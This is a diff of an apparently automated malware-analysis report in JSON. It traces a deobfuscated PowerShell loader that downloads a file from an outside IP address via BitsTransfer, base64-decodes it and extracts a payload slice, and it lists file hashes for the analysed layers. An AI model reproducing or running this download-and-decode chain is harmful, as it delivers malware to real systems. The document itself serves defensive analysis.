@@ -5,7 +5,7 @@
     "sections": [
       {
         "auto_collapse": false,
-        "body": "[Invoke-Expression] Execute/Open: $Scratc2=$env:windir\n\n[Invoke-Expression] Execute/Open: $Rekrnk=$Scratc2+$Rekrnk\n\n[Invoke-Expression] Execute/Open: $Fluoridi = ((gwmi win32_process -F ProcessId=${PID}).CommandLine) -split [char]34\n\n[Invoke-Expression] Execute/Open: $Inddataa = $Fluoridi[$Fluoridi.count-2]\n\n[Invoke-Expression] Execute/Open: $Sfinks=(Test-Path $Rekrnk) -And ([IntPtr]::size -eq 8)\n\n[Test-Path] \\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe\n\n[Invoke-Expression] Execute/Open: $Scratc2=$env:appdata\n\n[Invoke-Expression] Execute/Open: Import-Module BitsTransfer\n\n[Import-Module] BitsTransfer\n\n[Invoke-Expression] Execute/Open: $Disku=(Test-Path $Scratc2)\n\n[Test-Path] \\Jagtedesh.Sal\n\n[Invoke-Expression] Execute/Open: Start-BitsTransfer -Source $rene -Destination $Scratc2\n\n[Start-BitsTransfer] Download From: http://103.10.68.110/zimbra/Tekstli.asd --> Save To: \\Jagtedesh.Sal\n\n[Invoke-Expression] Execute/Open: Start-Sleep 5\n\n[Start-Sleep] 5\n\n[Invoke-Expression] Execute/Open: $Frdiges = Get-Content $Scratc2\n\n[Get-Content] \\Jagtedesh.Sal\n\n[Invoke-Expression] Execute/Open: $Skibsfa = [System.Convert]::FromBase64String($Frdiges)\n\n[Invoke-Expression] Execute/Open: $Actino2 = [System.Text.Encoding]::ASCII.GetString($Skibsfa)\n\n[Invoke-Expression] Execute/Open: $Dogger=$Actino2.substring(204100,25397)\n",
+        "body": "[Invoke-Expression] Execute/Open: $Scratc2=$env:windir\n\n[Invoke-Expression] Execute/Open: $Rekrnk=$Scratc2+$Rekrnk\n\n[Invoke-Expression] Execute/Open: $Fluoridi = ((gwmi win32_process -F ProcessId=${PID}).CommandLine) -split [char]34\n\n[Invoke-Expression] Execute/Open: $Inddataa = $Fluoridi[$Fluoridi.count-2]\n\n[Invoke-Expression] Execute/Open: $Sfinks=(Test-Path $Rekrnk) -And ([IntPtr]::size -eq 8)\n\n[Test-Path] \\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe\n\n[Invoke-Expression] Execute/Open: $Scratc2=$env:appdata\n\n[Invoke-Expression] Execute/Open: Import-Module BitsTransfer\n\n[Import-Module] BitsTransfer\n\n[Invoke-Expression] Execute/Open: $Disku=(Test-Path $Scratc2)\n\n[Test-Path] \\Jagtedesh.Sal\n\n[Invoke-Expression] Execute/Open: Start-BitsTransfer -Source $rene -Destination $Scratc2\n\n[Start-BitsTransfer] Download From: http://103.10.68.110/zimbra/Tekstli.asd --> Save To: \\Jagtedesh.Sal\n\n[Invoke-Expression] Execute/Open: Start-Sleep 5\n\n[Start-Sleep] 5\n\n[Invoke-Expression] Execute/Open: $Disku=(Test-Path $Scratc2)\n\n[Test-Path] \\Jagtedesh.Sal\n\n[Invoke-Expression] Execute/Open: Start-BitsTransfer -Source $rene -Destination $Scratc2\n\n[Start-BitsTransfer] Download From: http://103.10.68.110/zimbra/Tekstli.asd --> Save To: \\Jagtedesh.Sal\n\n[Invoke-Expression] Execute/Open: Start-Sleep 5\n\n[Start-Sleep] 5\n\n[Invoke-Expression] Execute/Open: $Frdiges = Get-Content $Scratc2\n\n[Get-Content] \\Jagtedesh.Sal\n\n[Invoke-Expression] Execute/Open: $Skibsfa = [System.Convert]::FromBase64String($Frdiges)\n\n[Invoke-Expression] Execute/Open: $Actino2 = [System.Text.Encoding]::ASCII.GetString($Skibsfa)\n\n[Invoke-Expression] Execute/Open: $Dogger=$Actino2.substring(204100,25397)\n",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -333,30 +333,30 @@
   "files": {
     "extracted": [
       {
-        "name": "deobfuscated_by_ps1profiler_layer_2",
-        "sha256": "0bf3bbd726c3500bb382cd1c066153739f20bfe988ae408985b99c72f38f9587"
+        "name": "deobfuscated_by_ps1profiler_layer_1",
+        "sha256": "4095a819328a961d77d9c5cb461a569b209ebefeee83f2e82bd57c225a37f7b2"
       },
       {
         "name": "deobfuscated_by_ps1profiler_6db756ef33294db47957b8351d4419dbff3fa7aa508259f419b669eef017fe09",
         "sha256": "9fa1d526e35d9671dab8d9cdc59bed18eac6858e2451b6ccc73fb6d782f4419a"
       },
       {
-        "name": "deobfuscated_by_ps1profiler_layer_1",
-        "sha256": "ee2b22d1fcb64117d8c745d7b29651ffcf2053f88c62d9b38196c7264a5f08ed"
+        "name": "deobfuscated_by_ps1profiler_layer_2",
+        "sha256": "d605a2483304f2a324d4d4350c27e3280aac986fe40007e325841ec3abf2f141"
       }
     ],
     "supplementary": [
+      {
+        "name": "layer_1.ps1",
+        "sha256": "03f5c72073d2f0efe9fc48d900631807d94d77302307d0a27fb5b95469af0681"
+      },
       {
         "name": "35b84df60a53824137133bfe0c5d763519669a9759b26d201fbdb3b990f221e8",
         "sha256": "35b84df60a53824137133bfe0c5d763519669a9759b26d201fbdb3b990f221e8"
       },
       {
-        "name": "layer_1.ps1",
-        "sha256": "a25456acb5ec4119bb9b6eb0aa088725bb23ccb68882db965e97955f8feb46ef"
-      },
-      {
         "name": "layer_2.ps1",
-        "sha256": "ad18b3bfef94026c9d650f3080883c051063cb7134c9c5b9e161c4948f4e49fd"
+        "sha256": "a860f7d90f233fcf0936ef9b7c3ef01d0a1669182a32fcef4ab0ed7df6ba1c32"
       }
     ]
   },
